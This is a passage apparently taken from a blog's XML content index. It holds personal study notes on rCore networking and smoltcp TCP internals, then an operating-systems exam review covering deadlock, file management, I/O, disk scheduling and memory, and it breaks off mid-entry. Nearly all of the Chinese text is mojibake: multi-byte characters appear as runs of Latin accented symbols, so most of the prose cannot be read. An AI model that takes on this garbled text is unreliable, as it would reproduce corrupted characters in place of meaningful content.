title="å‡½æ•°çš„æ™®éè¿‡ç¨‹"></a>å‡½æ•°çš„æ™®éè¿‡ç¨‹</h2><p>æ™®éå‡½æ•°è°ƒç”¨è¿‡ç¨‹ ï¼Œè·å– SOCKETS çš„äº’æ–¥é”ï¼Œ å¹¶è·å–ä»–çš„å¥æŸ„ï¼Œè½¬ç±»å‹ä¸º TcpSocket æˆ– UcpSocket</p><p>è¿›è¡Œå¯¹ socket çš„æ“ä½œï¼Œç„¶ååŠæ—¶å°†é”å’Œå¥æŸ„drop æ‰</p><p><strong>TODO</strong>ï¼š ioctl å’Œ ArpSeq çš„éƒ¨åˆ† å¯èƒ½è¿˜éœ€è¦å†ç ”ç©¶ä¸€ä¸‹</p><h1 id="Smoltcp-åˆ†æ"><a href="#Smoltcp-åˆ†æ" class="headerlink" title="Smoltcp åˆ†æ"></a>Smoltcp åˆ†æ</h1><h2 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h2><p>Tcp State :   [enum] ç”± rfc 793 è§„å®šçš„ 11 ç§çŠ¶æ€</p><img src="https://github.com/yunwei37/rCore-net/blob/master/docs/dingiso/imgs/TCP%E7%8A%B6%E6%80%81%E8%BD%AC%E6%8D%A2.png" alt="TCPçŠ¶æ€è½¬æ¢å›¾"><h3 id="Timer"><a href="#Timer" class="headerlink" title="Timer :"></a>Timer :</h3><ul><li>[enum]  ç”±timer è§¦å‘çš„é‡ä¼ ï¼Œå¿«é€Ÿé‡ä¼ ç­‰è¡Œä¸º</li><li>set_for_idle()   è®¾å®šæ´»è·ƒæ—¶é—´ä¸º å½“å‰æ—¶é—´æˆ³ timestamp + è®¾å®šçš„æ—¶é—´é—´éš” interval</li><li>should_keep_alive()   åˆ¤æ–­å½“å‰æ—¶é—´æˆ³æ˜¯å¦ &gt;= æ´»è·ƒæ—¶é—´ </li><li>should_retransmit() <ul><li>æ—¶é—´æˆ³å¤§äºé‡ä¼ æœŸé™åˆ™é‡ä¼ ï¼Œè¿”å› è¶…æ—¶æ—¶é—´+å»¶è¿Ÿ  </li><li>å¿«é€Ÿé‡ä¼  è¿”å› 0</li></ul></li><li>set_keep_alive() åˆå§‹åŒ– æ´»è·ƒæ—¶é—´ä¸º 0</li><li>should_close() æ—¶é—´æˆ³å¤§äºå…³é—­æœŸé™ è¿”å› true</li><li>poll_at è¿”å› socket ä¸‹ä¸€æ¬¡è¢« poll çš„æ—¶é—´</li></ul><h3 id="TcpSocket"><a href="#TcpSocket" class="headerlink" title="TcpSocket"></a>TcpSocket</h3><ul><li>struct ä¸»è¦åŒ…æ‹¬ä¸€ä¸‹å†…å®¹<ul><li>ä¸¤ä¸ªbuffer å­˜å‚¨ æ¥å—çš„å†…å®¹å’Œè¦å‘é€çš„å†…å®¹</li><li>state  ï¼šä¿å­˜socket çš„çŠ¶æ€</li><li>timer ï¼šç”¨äºè®¡æ—¶</li><li>assembler ï¼šç¼“å†²åŒºçš„ é‡æ–°ç»„è£…</li><li>addr åŠ endpoint : æœ¬åœ°ipåŠæ¥å£å’Œ è¿œç¨‹çš„ ip åŠ æ¥å£</li><li>seq_no  : Tcpä¸­çš„ sequence number</li><li>ack ï¼š ackç </li><li>win ï¼š Tcp çš„å‘é€çª—å£ç›¸å…³å†…å®¹</li></ul></li><li>listen  :  å¼€å§‹ç›‘å¬æœ¬æœºç›¸åº”ç«¯å£ï¼Œopenä¼šè¿”å› illegal ï¼Œ ç«¯å£ä¸º0 åˆ™è¿”å› unaddressable</li><li>connect :  è·Ÿè¿œç¨‹endpointè¿æ¥ï¼Œç«¯å£æœŸæœ›ç»™å‡ºï¼Œå¦åˆ™åˆ†é…ä¸€ä¸ª 49152-65535 ç«¯å£</li><li>close ï¼šå…³é—­å…¨åŒå·¥è¿æ¥çš„ä¼ è¾“éƒ¨åˆ†</li></ul><h5 id="é—®é¢˜ï¼š"><a href="#é—®é¢˜ï¼š" class="headerlink" title="é—®é¢˜ï¼š"></a>é—®é¢˜ï¼š</h5><ul><li>TcpSocketStateçš„ writeå‡½æ•°ï¼Œ ç¬¬äºŒä¸ªå‚æ•°  <code>_send_to_endpoint</code> å¹¶æ²¡æœ‰ä½¿ç”¨ï¼Œ æäº† issue <a href="https://github.com/rcore-os/rCore/issues/69">[Bug Report] wrong of fn write in the TcpSocketState</a>  </li></ul><p>å¥½å§ï¼Œæˆ‘å‚»äº†ï¼Œæ­¤å‚æ•°åªæ˜¯ç”¨æ¥å¡«å……ä»¥ä¿è¯ trait çš„å®ç°çš„ã€‚ï¼ˆèœï¼‰</p><ul><li>smoltcp -  storage/ring_buffer.rs  255è¡Œ dequeue_slice å‡½æ•°ä¸ºä»€ä¹ˆè®¡ç®—ä¸¤æ¬¡size</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> rCore </tag>
            
            <tag> risc-v </tag>
            
            <tag> os </tag>
            
            <tag> network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ“ä½œç³»ç»ŸæœŸæœ«æ€»ç»“</title>
      <link href="/2020/08/27/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%20%E6%9C%9F%E6%9C%AB%E6%80%BB%E7%BB%93/"/>
      <url>/2020/08/27/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%20%E6%9C%9F%E6%9C%AB%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>æœ¬æ–‡æ˜¯å¯¹æ“ä½œç³»ç»Ÿçš„è¯¾ç¨‹çš„æœŸæœ«æ€»ç»“çš„æ–‡æ¡£-å¸®åŠ©è‡ªå·±äº†è§£æ•´ä½“çš„ç»“æ„<br><code>reference</code>ï¼šmooc ä¸Šå—äº¬å¤§å­¦ éª†æ–Œ è€å¸ˆçš„PPT</p><a id="more"></a><h1 id="æ“ä½œç³»ç»Ÿ-æœŸæœ«æ€»ç»“"><a href="#æ“ä½œç³»ç»Ÿ-æœŸæœ«æ€»ç»“" class="headerlink" title="æ“ä½œç³»ç»Ÿ æœŸæœ«æ€»ç»“"></a>æ“ä½œç³»ç»Ÿ æœŸæœ«æ€»ç»“</h1><h4 id="è¿‡ç¨‹-â€”-ç®—æ³•"><a href="#è¿‡ç¨‹-â€”-ç®—æ³•" class="headerlink" title="è¿‡ç¨‹  â€”- ç®—æ³•"></a>è¿‡ç¨‹  â€”- ç®—æ³•</h4><p>è®¾å¤‡æ¶‰åŠæ•°æ®æœºæ„ï¼šè®¾å¤‡æ§åˆ¶è¡¨DCT ï¼›æ§åˆ¶å™¨æ§åˆ¶è¡¨COCTï¼›é€šé“æ§åˆ¶è¡¨CHCTï¼›ç³»ç»Ÿè®¾å¤‡è¡¨SDT</p><p>ä½œä¸š - å¹³æ—¥ç»ƒä¹ </p><p>è®¡ç®—æœºæ¦‚è¿° ï¼š é€‰æ‹©</p><p>å¤„ç†å™¨ ï¼š å†…æ ¸æ¨¡å¼ï¼Œç”¨æˆ·æ¨¡å¼ï¼Œä¸­æ–­</p><p>å¤„ç†å™¨ç®¡ç†ï¼šè¿›ç¨‹ï¼Œç¨‹åºåŒºåˆ«ï¼Œä¸ºä»€ä¹ˆæå‡ºè¿›ç¨‹ï¼Œè¿›ç¨‹çŠ¶æ€è½¬æ¢ï¼Œè¿›ç¨‹ç®¡ç†ï¼ˆåˆ›å»ºï¼‰åŸå­æ“ä½œ</p><p>çº¿ç¨‹ï¼š ä¸ºä»€ä¹ˆæå‡ºçº¿ç¨‹ï¼Œçº¿ç¨‹å’Œè¿›ç¨‹åŒºåˆ«åœ¨å“ªé‡Œï¼Œç”¨æˆ·çº§çº¿ç¨‹ï¼Œå†…æ ¸çº§çº¿ç¨‹ï¼Œå¤šçº¿ç¨‹çš„æ··åˆå®ç°ï¼ˆCPUè°ƒåº¦ï¼‰</p><p>å­˜å‚¨ï¼šç‰©ç†å†…å­˜ï¼Œï¼ˆè¿ç»­ï¼Œç¦»æ•£ï¼‰ï¼Œé¡µå¼ç®¡ç† å¯»å€ï¼Œæ®µé¡µåŒºåˆ«ï¼Œç®¡ç†</p><p>è®¾å¤‡ï¼šI/Oå­ç³»ç»Ÿï¼Œç¼“å†²åŒºï¼ŒSPoolingï¼Œè„±æœº ï¼Œç£ç›˜è°ƒåº¦</p><p>æ–‡ä»¶ï¼šæ–‡ä»¶é€»è¾‘ç»“æ„ï¼Œç‰©ç†ç»“æ„ï¼Œç›®å½•ç»“æ„ï¼Œç›®å½•ç®¡ç†ï¼Œè¾…å­˜ç©ºé—´</p><p>PVæ“ä½œï¼Œéœå°”ç®¡ç¨‹</p><p>æ­»é”</p><p>å¤§é¢˜ï¼š</p><ul><li>PVæ“ä½œï¼Œç”Ÿäº§-æ¶ˆè´¹åŒæ­¥ ï¼Œ è¯»è€…å†™è€…é—®é¢˜ï¼Œç»ƒä¹ é¢˜ï¼ˆåŸºç¡€çŸ¥è¯† æŒæ¡ä¿¡å·é‡ï¼‰<ul><li>æ­»é”é¿å…ï¼Œé“¶è¡Œå®¶ç®—æ³•ï¼Œå…¶ä»–æ­»é”æ£€æµ‹ç®—æ³•ï¼Œå•èµ„æº ï¼Œèµ„æºåˆ†é…å›¾</li></ul></li><li>æ®µé¡µå¼ç®¡ç† å·¥ä½œåŸç†ï¼Œç¼ºé¡µæ›¿æ¢ç®—æ³•</li><li>CPUè°ƒåº¦ç®—æ³•</li><li>ç£ç›˜è°ƒåº¦ç®—æ³•</li></ul><h3 id="å¹¶å‘ç¨‹åºè®¾è®¡"><a href="#å¹¶å‘ç¨‹åºè®¾è®¡" class="headerlink" title="å¹¶å‘ç¨‹åºè®¾è®¡"></a>å¹¶å‘ç¨‹åºè®¾è®¡</h3><p>ç¨‹åºæ‰§è¡Œçš„å¤–éƒ¨é¡ºåºæ€§ï¼ˆå¤šä¸ªç¨‹åºæ‰§è¡Œæœ‰åºï¼‰ å’Œ å†…éƒ¨é¡ºåºæ€§ï¼ˆç¨‹åºCPUæ‰§è¡Œæœ‰åºï¼‰</p><p>ä¸´ç•ŒåŒº - ç¨‹åºæ®µï¼Œå¤šä¸ªè¿›ç¨‹åœç•™åœ¨ç›¸å…³ä¸´ç•ŒåŒºåˆ™å‡ºç°é”™è¯¯</p><p>ä¸´ç•ŒåŒºä¹‹å¤šæœ‰ä¸€ä¸ªè¿›ç¨‹ï¼Œä¸èƒ½æ— é™åœç•™ï¼Œä¸èƒ½æ— é™ç­‰å¾…è¿›å…¥</p><p>è¿›ä¸´ç•ŒåŒº å…³ä¸­æ–­ï¼Œå‡ºä¸´ç•ŒåŒº å¼€ä¸­æ–­</p><p>ç”¨æˆ·ç¨‹åº ï¼šä¿¡å·é‡ PVåŸè¯­ï¼Œ</p><p>semaphore ï¼š å€¼ä¸ºå¯å‡ ä¸ªè¿›ç¨‹è¿›å…¥ä¸´ç•ŒåŒºï¼Œå…·æœ‰ç­‰å¾…è¿›ç¨‹é˜Ÿåˆ— </p><p>p æ“ä½œ væ“ä½œ ä¸€ä¸€åŒ¹é…</p><p>åŒæ­¥å…³ç³» å†³å®š å‡ ä¸ªä¿¡å·é‡</p><p>ä¸€ç”Ÿäº§ä¸€æ¶ˆè´¹å¤šç¼“å†² ï¼š ä¸¤ä¸ªä¿¡å·é‡sput sget ä¸€ä¸ªkç¼“å†²é˜Ÿåˆ—ï¼Œä¸¤å¾ªç¯é˜Ÿåˆ—æŒ‡é’ˆ</p><p>å¤šç”Ÿäº§å¤šæ¶ˆè´¹ï¼š å¤šä¸ªè¿›ç¨‹å…±äº« å¾ªç¯é˜Ÿåˆ—æŒ‡é’ˆï¼Œå¯¹æŒ‡é’ˆå¢åŠ ä¸¤ä¸ªä¿¡å·é‡</p><p>ç®¡ç¨‹è¿‡ç¨‹ äº’æ–¥è°ƒç”¨</p><h4 id="æ­»é”"><a href="#æ­»é”" class="headerlink" title="æ­»é”"></a>æ­»é”</h4><p>å››ä¸ªå¿…è¦æ¡ä»¶ï¼š äº’æ–¥ï¼Œå æœ‰å’Œç­‰å¾…ï¼Œä¸å‰¥å¤ºï¼Œå¾ªç¯ç­‰å¾…</p><p>æ­»é”çš„é˜²æ­¢ï¼š </p><ul><li>ç ´åç¬¬ä¸€ä¸ªæ¡ä»¶ï¼šç‹¬å å‹èµ„æº æ”¹é€ æˆ å…±äº«å‹èµ„æº</li><li>ç ´åä¸‰ ï¼šå‰¥å¤ºå¼è°ƒåº¦</li><li>ç ´åå››ï¼šå±‚æ¬¡åˆ†é…</li><li>é¢„åˆ†é… ï¼š</li></ul><p>æ­»é”çš„é¿å…ï¼šé“¶è¡Œå®¶ç®—æ³•</p><p>æ­»é”çš„æ£€æµ‹ï¼šWarshallä¼ é€’é—­åŒ… ï¼Œæ£€æµ‹åï¼Œé‡å¯æˆ– æ£€éªŒç‚¹é‡å¯</p><h3 id="æ–‡ä»¶ç®¡ç†"><a href="#æ–‡ä»¶ç®¡ç†" class="headerlink" title="æ–‡ä»¶ç®¡ç†"></a>æ–‡ä»¶ç®¡ç†</h3><p>æ–‡ä»¶ç‰©ç†ç»“æ„ ï¼š</p><ul><li>é¡ºåºæ–‡ä»¶ï¼šæ•°ç»„ - å¿«é€Ÿå­˜å– ï½œé¢„å…ˆåˆ†é…ç©ºé—´ï¼Œä¸æ˜“å¢åˆ æ”¹</li><li>è¿æ¥æ–‡ä»¶ï¼šé“¾è¡¨ - è¿æ¥å­—ï¼ˆæŒ‡é’ˆï¼‰ä¸º0ç»“å°¾ ï¼Œæ˜“äºå¢åˆ æ”¹ ï½œéœ€è¦é¢å¤–ç©ºé—´ï¼Œä»…é¡ºåº</li><li>ç›´æ¥æ–‡ä»¶ï¼šhashæ•£åˆ—</li><li>ç´¢å¼•æ–‡ä»¶ï¼šã€Škeyï¼Œvalueã€‹-ç´¢å¼•åŒºï¼Œæ•°æ®åŒº é“¾è¡¨æ‹“å±• ï½œéœ€è¦æŸ¥ä¸¤æ¬¡</li></ul><p>æ–‡ä»¶ç›®å½•ï¼š</p><ul><li>ä¸€çº§ï¼Œç”¨æˆ·æ–‡ä»¶ä¼—å¤šï¼Œå®¹æ˜“é‡åï¼Œä¸åˆ©è®°å¿†</li><li>äºŒçº§ï¼Œ ç”¨æˆ·-æ–‡ä»¶ç›®å½•ã€‚æŒ‰ç”¨æˆ· æœ‰ç”¨æˆ·æƒé™</li><li>æ ‘å½¢ï¼Œå¯é‡åï¼Œæœ‰æƒé™ è·¯å¾„åä¸ºæ ¹åˆ°ç»“ç‚¹</li></ul><p>æ–‡ä»¶æŸ¥æ‰¾ï¼š</p><ul><li>æŸ¥æ‰¾é¡¹ï¼šæ–‡ä»¶è·¯å¾„å </li><li>æŸ¥æ‰¾æ³•ï¼šé¡ºåºï¼ŒäºŒåˆ†ï¼Œæ–‡ä»¶åå˜æ¢æˆå”¯ä¸€å€¼â€œæ‚å‡‘æ³•â€</li><li>æ´»åŠ¨æ–‡ä»¶è¡¨ï¼š <ul><li>å¤šç›®å½•è®¿å­˜ï¼Œå¤šæ¬¡è®¿é—®å­˜å‚¨å™¨å¼€é”€å¤§ï¼Œå°†å¸¸ç”¨ï¼Œæ­£ç”¨å¤åˆ¶è¿›ä¸»å­˜</li><li>ä¿å­˜æ–‡ä»¶ç›®å½•ä¿¡æ¯è€Œä¸æ˜¯å…¨éƒ¨ä¿¡æ¯ï¼Œèƒ½ä¸€æ­¥æ‰¾åˆ°æ–‡ä»¶</li></ul></li></ul><p>æ–‡ä»¶çš„å®‰å…¨ä¸ä¿æŠ¤</p><ul><li>å…±äº«ï¼ˆç”¨æˆ·æƒé™ï¼‰ï¼Œä¿æŠ¤ï¼ˆé˜²ç ´åï¼‰ï¼Œä¿å¯†ï¼ˆé˜²çªƒå–ï¼‰</li><li>ä¿å¯†æªæ–½ï¼šéšè”½æ–‡ä»¶ç›®å½•ï¼Œè®¾ç½®å£ä»¤ï¼Œä½¿ç”¨å¯†ç </li><li>ä¿æŠ¤æªæ–½ï¼šå‰¯æœ¬ï¼Œå­˜å–è¡¨ï¼ˆå­˜ç”¨æˆ·-å±æ€§ï¼‰ï¼Œå±æ€§</li></ul><p>æ–‡ä»¶çš„å­˜å–</p><ul><li>é¡ºåºå­˜å–ï¼šè¯»æŒ‡é’ˆï¼ˆå¯è·³ï¼‰ï¼Œå†™æŒ‡é’ˆ</li><li>ç›´æ¥å­˜å–ï¼šå¯¹è®°å½•è¿›è¡Œæ“ä½œï¼Œhash</li><li>ç´¢å¼•å­˜å–ï¼šæŒ‰é”®å­˜å–</li></ul><p>æ–‡ä»¶çš„ä½¿ç”¨</p><ul><li>ä¸¤ç±»æ¥å£ï¼š æ“ä½œæ–‡ä»¶æ•´ä½“ï¼Œè¯»å†™ç­‰å¯¹æ–‡ä»¶æœ¬èº«</li><li>å»ºç«‹æ–‡ä»¶ï¼šå»ºç«‹æ–‡ä»¶ç›®å½•é¡¹-åˆ†é…ç‰©ç†å—-ç”³è¯·æ´»åŠ¨æ–‡ä»¶è¡¨-ç™»è®°è¡¨-è¿”å›æ–‡ä»¶å¥æŸ„</li><li>æ’¤é”€æ–‡ä»¶ï¼šå…³é—­æ–‡ä»¶-è”è®¿-åˆ å»ç›®å½•é¡¹-é‡Šæ”¾ç©ºé—´</li><li>æ‰“å¼€æ–‡ä»¶ï¼šç”³è¯·æ´»åŠ¨æ–‡ä»¶è¡¨é¡¹-æŸ¥æ‰¾æ–‡ä»¶-å¤åˆ¶åˆ°è¡¨é¡¹-å…±äº«æ–‡ä»¶å¤„ç†-è¿”å›å¥æŸ„</li><li>å…³é—­æ–‡ä»¶ï¼šè¡¨é¡¹â€œç”¨æˆ·æ•°â€ -1</li><li>è¯»å†™æ–‡ä»¶ï¼šæ‰¾åˆ° é€»è¾‘è®°å½•- å˜ä¸º ç‰©ç†å¿«</li><li>å®šä½æ–‡ä»¶ï¼šè°ƒæ•´è¯»å†™æŒ‡é’ˆä½ç½®</li></ul><p>è¾…å­˜ç©ºé—´ç®¡ç†</p><ul><li>è¿ç»­åˆ†é…ï¼šè®¿é—®é€Ÿåº¦å¿«ï¼Œå®šæ—¶â€œç¢ç‰‡â€æ•´ç†â€œ</li><li>éè¿ç»­ï¼šç©ºé—´ç®¡ç†æ•ˆç‡é«˜ï¼Œä¾¿äºæ–‡ä»¶åŠ¨æ€å¢é•¿ï¼Œæ”¶ç¼©</li><li>ä½ç¤ºå›¾ï¼šç©ºé—²å—ç®¡ç†  - é«˜é€Ÿåˆ†å»é…</li><li></li></ul><h2 id="IOè®¾å¤‡"><a href="#IOè®¾å¤‡" class="headerlink" title="IOè®¾å¤‡"></a>IOè®¾å¤‡</h2><p>æ“ä½œç³»ç»Ÿ  ä¸ æ§åˆ¶å™¨ äº¤äº’ï¼Œè€Œéä¸è®¾å¤‡äº¤äº’</p><p>IOæ§åˆ¶æ–¹å¼</p><ul><li>è½®è¯¢</li><li>ä¸­æ–­ CPUè´Ÿè´£å‘å‡ºI/Oå‘½ä»¤ï¼Œå“åº”ä¸­æ–­ ï½œæ§åˆ¶å™¨è´Ÿè´£æ£€æŸ¥çŠ¶æ€ å°±ç»ªåå‘é€ä¸­æ–­</li><li>DMA ä¸­æ–­çš„æ´»ç”±DMAæ‰§è¡Œ CPUåªåœ¨æ•°æ®ä¼ é€å¼€å§‹ï¼ˆåˆå§‹åŒ–DMAï¼‰ç»“æŸï¼ˆå“åº”ä¸­æ–­ï¼Œä¸å¿…ä¿æŠ¤ç°åœºï¼‰å‚ä¸<ul><li>å‘¨æœŸçªƒå– - CPUè®¿é—®æ€»çº¿è¾ƒå°‘ï¼Œä¸ç”¨çš„æ—¶å€™å¯ä»¥ç»™DMAç”¨</li></ul></li><li>I/Oé€šé“ å°†I/OæŒ‡ä»¤å•ç‹¬ç”±é€šé“åŒ…å«å¤„ç†å™¨æ‰§è¡Œ<ul><li>å¯æ§åˆ¶å¤šå°ä¸åŒç±»è®¾å¤‡</li><li>æµç¨‹ï¼šcpué‡åˆ°I/Oï¼Œå¯åŠ¨é€šé“-cpuæ‰§è¡Œå…¶ä»–-é€šé“å®Œæˆåå‘å‡ºä¸­æ–­-CPUå¤„ç†I/O ã€å¹¶è¡Œã€‘</li></ul></li></ul><p>æ€»çº¿</p><ul><li>å•æ€»çº¿ ï¼š æ˜“äºæ‰©å……ã€‚ï½œ ä¼ è¾“æ—¶å»¶å¤§ï¼Œä¸²è¡Œ</li><li>ä¼ ç»Ÿä¸‰æ€»çº¿ ï¼šCPUä¸I/Oéš”ç¦»ï¼Œæ”¯æŒæ›´å¤šI/Oè®¾å¤‡ ï½œ æ²¡æŠŠI/Oåˆ†å¼€ï¼Œé€Ÿç‡å·®åˆ«å¤§ä¸å¹¸</li><li>å—åŒ—æ¡¥ï¼šæ”¯æŒä¸åŒé€Ÿç‡I/O</li><li>é€šé“å¤šçº§æ€»çº¿ï¼šå¥½</li></ul><p>ä»ä¸‹è‡³ä¸Š IOè½¯ä»¶</p><ul><li><p>é«˜æ•ˆç‡ï¼Œé€šç”¨æ€§</p></li><li><p>è®¾å¤‡æ— å…³æ€§ï¼Œå‡ºé”™å¤„ç†ï¼ŒåŒæ­¥/å¼‚æ­¥ä¼ è¾“ï¼Œç¼“å†²æŠ€æœ¯</p></li><li><p>ä¸­æ–­å¤„ç†ç¨‹åºï¼šæ£€æŸ¥è®¾å¤‡çŠ¶æ€å¯„å­˜å™¨ï¼Œæ ¹æ®æƒ…å†µå¤„ç†</p><ul><li>é”™ï¼šå‘ä¸ŠæŠ¥å‘Šé”™è¯¯ï¼Œé‡æ–°æ‰§è¡Œ</li><li>æ­£å¸¸ï¼šå”¤é†’ç­‰å¾…è¿›ç¨‹ï¼Œè½¬æ¢ä¸ºå°±ç»ªæ€</li><li>ç­‰å¾…ï¼šæœ‰ç­‰å¾…ä¼ è¾“I/Oï¼Œé€šçŸ¥å¯åŠ¨ä¸‹ä¸€ä¸ªI/Oè¯·æ±‚</li></ul></li><li><p>è®¾å¤‡é©±åŠ¨ç¨‹åº</p><ul><li>é€»è¾‘I/O è½¬åŒ–ä¸º ç‰©ç†I/O æ“ä½œ</li><li>ç›‘ç£ æ˜¯å¦ æ­£ç¡®æ‰§è¡Œï¼Œçº é”™ï¼Œ ç®¡ç†æ•°æ®ç¼“å†²åŒº</li><li>åŠŸèƒ½ï¼š è®¾å¤‡åˆå§‹åŒ–ï¼Œæ‰§è¡Œè®¾å¤‡é©±åŠ¨ä¾‹ç¨‹ï¼Œè°ƒç”¨å’Œæ‰§è¡Œä¸­æ–­ç¨‹åº</li><li>åªå¤„ç†ä¸€ç§è®¾å¤‡ï¼Œæˆ–ä¸€ç±»ç´§å¯†ç›¸å…³çš„è®¾å¤‡</li><li>æ•´ä½“ï¼ˆä¸ç§»æ¤ï¼‰ ï¼Œ åˆ†å±‚ï¼ˆç§»æ¤ï¼Œå¼€é”€å¢åŠ ï¼‰</li></ul></li><li><p>ç‹¬ç«‹äºè®¾å¤‡çš„I/Oè½¯ä»¶ï¼šé€‚ç”¨æ‰€æœ‰è®¾å¤‡ï¼Œå‘ç”¨æˆ·å±‚æä¾›æ¥å£</p><ul><li>å‘½åï¼Œä¿æŠ¤ï¼Œæä¾›æ•°æ®å•ä½ï¼Œç¼“å†²ï¼Œåˆ†é…çŠ¶æ€è·Ÿè¸ªï¼Œé”™è¯¯å¤„ç†æŠ¥å‘Š</li></ul></li><li><p>ç”¨æˆ·ç©ºé—´çš„I/Oè½¯ä»¶</p><ul><li>åº“å‡½æ•°ï¼ˆç”¨è®¿ç®¡æŒ‡ä»¤é™·å…¥å†…æ ¸ï¼Œå†…æ ¸å‡½æ•°å®ç° I/Oæ“ä½œ</li><li>Spooling å†…æ ¸å¤–çš„ç³»ç»ŸI/O</li></ul></li></ul><p>I/Oç¼“å†²</p><ul><li>è§£å†³é€Ÿåº¦ä¸åŒ¹é…</li><li>å•ç¼“å†²ï¼šæ•°æ®-ç¼“å†²åŒº-ç”¨æˆ·åŒº-åº”ç”¨ç¨‹åº ï½œ å†™ï¼šç”¨æˆ·åŒºå¤åˆ¶åˆ°ç¼“å†²åŒº</li><li>åŒç¼“å†²ï¼šä¸€ä¸ªä¾›ç”¨æˆ·ç¨‹åºä½¿ç”¨ï¼Œå¦ä¸€ä¸ªå¯ç»§ç»­è¾“å…¥è¾“å‡º</li><li>å¾ªç¯ç¼“å†²ï¼šé“¾è¡¨</li></ul><p>è®¾å¤‡ç‹¬ç«‹æ€§</p><ul><li>é€»è¾‘è®¾å¤‡ - ç‰©ç†è®¾å¤‡ ç‹¬ç«‹å¼€ï¼Œè°ƒç”¨ç±»è€Œä¸æ˜¯å•ä¸ªè®¾å¤‡</li><li>æé«˜çµæ´»æ€§ï¼Œéš”ç¦»æ€§ï¼Œ</li><li>æ¯ç±»å¯¹åº”è®¾å¤‡ç±»è¡¨ä¸­çš„ä¸€æ </li></ul><p>ç£ç›˜</p><ul><li><p>T<del>a</del>=T<del>S</del>+1/2r+b/rN  </p><ul><li>Ta å­˜å–æ—¶é—´ Ts å¯»é“æ—¶é—´ï¼Œrç£ç›˜æ—‹è½¬é€Ÿåº¦ï¼ˆè½¬/ç§’ï¼‰ï¼ŒBä¼ é€å­—èŠ‚æ•°ï¼ŒNä¸€ä¸ªç£é“ä¸­çš„å­—èŠ‚æ•°</li></ul></li><li><p>ç§»åŠ¨è‡‚è°ƒåº¦</p><ul><li>è°ƒåº¦ç­–ç•¥ï¼šå…ˆè¿›å…ˆå‡ºï¼ˆä½æ•ˆï¼‰ï¼Œæœ€çŸ­æŸ¥æ‰¾æ—¶é—´ä¼˜å…ˆï¼ˆé¥¥é¥¿ï¼‰</li><li>æ‰«æç®—æ³•ï¼šå•å‘ï¼ŒåŒå‘ï¼Œç”µæ¢¯è°ƒåº¦ï¼ˆå½“å‰ç§»åŠ¨æ–¹å‘æ²¡æœ‰ï¼Œåå‘æœ‰è¯·æ±‚æ—¶ï¼Œåå‘ï¼‰</li></ul></li><li><p>æ—‹è½¬è°ƒåº¦</p><ul><li>ä¼˜åŒ–åˆ†å¸ƒï¼šå¾ªç¯æ’åºï¼›ä¼˜åŒ–æ’åˆ—ï¼Œäº¤å‰åˆ†å¸ƒï¼ˆè¯»å–æœ‰å»¶è¿Ÿï¼‰ï¼ŒæŒ‰æŸ±é¢æ•°æ®è¯»å†™</li></ul></li></ul><p>è™šæ‹Ÿè®¾å¤‡ï¼š</p><ul><li>ä½¿ç”¨ä¸€ç±»ç‰©ç†è®¾å¤‡ æ¨¡æ‹Ÿ å¦ä¸€ç±»ç‰©ç†è®¾å¤‡</li></ul><p>SPOOLing</p><ul><li>ç£ç›˜å¼€è¾Ÿè¾“å…¥äº•å’Œè¾“å‡ºäº•ï¼Œæœ‰é¢„è¾“å…¥ç¨‹åºï¼Œé¢„è¾“å‡ºç¨‹åºï¼Œäº•ç®¡ç†ç¨‹åº</li><li>é¢„è¾“å…¥ï¼šä½œä¸šå¼€å§‹å‰æ•°æ®é¢„å…ˆè¾“å…¥ç£ç›˜ç¼“å†²åŒºï¼Œçœå»å¯åŠ¨è¾“å…¥è®¾å¤‡æ—¶é—´</li><li>ç¼“è¾“å‡ºï¼šè¾“å‡ºå­˜åœ¨ç¼“å†²åŒºï¼Œä½œä¸šæ‰§è¡Œå®Œï¼Œå†ç”±æ“ä½œç³»ç»Ÿæˆæ‰¹å¤„ç†</li><li>å°† ç‹¬å è®¾å¤‡ å˜ä¸ºå…±äº«è®¾å¤‡ â€œå‡è„±æœºçœŸè”æœºâ€</li><li>-ï¼ˆé¢„è¾“å…¥ï¼‰-è¾“å…¥çŠ¶æ€ -ï¼ˆé¢„è¾“å…¥å®Œæˆï¼‰- æ”¶å®¹çŠ¶æ€ -ï¼ˆä½œä¸šè°ƒåº¦ï¼Œé€‰ä¸­å¹¶åˆ›å»ºè¿›ç¨‹ï¼‰</li><li>æ‰§è¡ŒçŠ¶æ€ï¼ˆè¿›ç¨‹è¿è¡Œï¼‰ -ï¼ˆä½œä¸šè°ƒåº¦ï¼Œç»ˆæ­¢æ’¤ç¦»ï¼‰- å®ŒæˆçŠ¶æ€-ï¼ˆç¼“è¾“å‡ºï¼‰-</li></ul><h2 id="å†…å­˜ç®¡ç†"><a href="#å†…å­˜ç®¡ç†" class="headerlink" title="å†…å­˜ç®¡ç†"></a>å†…å­˜ç®¡ç†</h2><p>æ®µå¼ç¨‹åºè®¾è®¡- æ®µè¦†ç›–æŠ€æœ¯ï¼ˆä¸ç›¸å…³ç¨‹åºæ›¿æ¢æ‰§è¡Œå®Œä»£ç ï¼‰</p><p>å¤ç”¨ - åˆ†åŒºå¤ç”¨ï¼Œé¡µæ¶å¤ç”¨</p><p>åœ°å€è½¬æ¢ï¼š é€»è¾‘-ç‰©ç† é™æ€/åŠ¨æ€</p><p>ç©ºé—´ åˆ†å»é…ï¼Œ 